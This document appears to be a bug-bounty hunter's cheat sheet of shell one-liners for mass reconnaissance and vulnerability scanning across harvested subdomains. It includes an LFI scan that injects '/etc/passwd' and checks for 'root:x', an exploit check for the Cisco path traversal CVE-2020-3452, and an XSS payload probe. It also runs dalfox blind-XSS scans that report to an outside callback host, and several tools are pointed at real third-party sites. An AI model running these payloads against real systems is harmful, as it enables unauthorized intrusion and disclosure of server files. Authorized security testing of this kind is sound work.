# Method 1

## domains

cat wildcards.txt | assetfinder -subs-only | anew domains

amass enum -df wildcards.txt | anew domains

subfinder -silent -dL wildcards.txt| anew domains

## one liners and tools

sort -u domains | httprobe > uniq.txt

crlfuzz -l uniq.txt -s

gau uniq.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

cat uniq.txt |waybackurls | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b l3gend.xss.ht pipe > OUT.txt

python3 ~/tools/Corsy/corsy.py -i uniq.txt 

python3 ~/tools/XSStrike/xsstrike.py -u "https://www.glassdoor.com/rss/interviews.rss?id=lol" 

python3 ~/tools/smuggler/smuggler.py -u "https://google.com" -m GET -q

python3 ~/tools/mass-bounty/CRLF-Injection-Scanner/crlf_scan.py -i uniq.txt

        * CVE-2020-3452
        
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
 
cat uniq.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

```text
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

subzy -targets domains -hide_fails

```text
jaeles scan -s /root/.jaeles/base-signatures/cves/* -U domains.txt
```

## Heavy 

eyewitness --web -f uniq.txt -d /path_to_save_screenshots ##### optional , takes time, better grep for juicy domains and move forward

```bash
for I in $(ls); do 
        echo "$I" >> index.html;
        echo "<img src=$I><br>" >> index.html;
done
```

## dalfox

python3 ~/tools/ParamSpider/paramspider.py --domain google.com -o param.txt

dalfox -b l3gend.xss.ht file param.txt
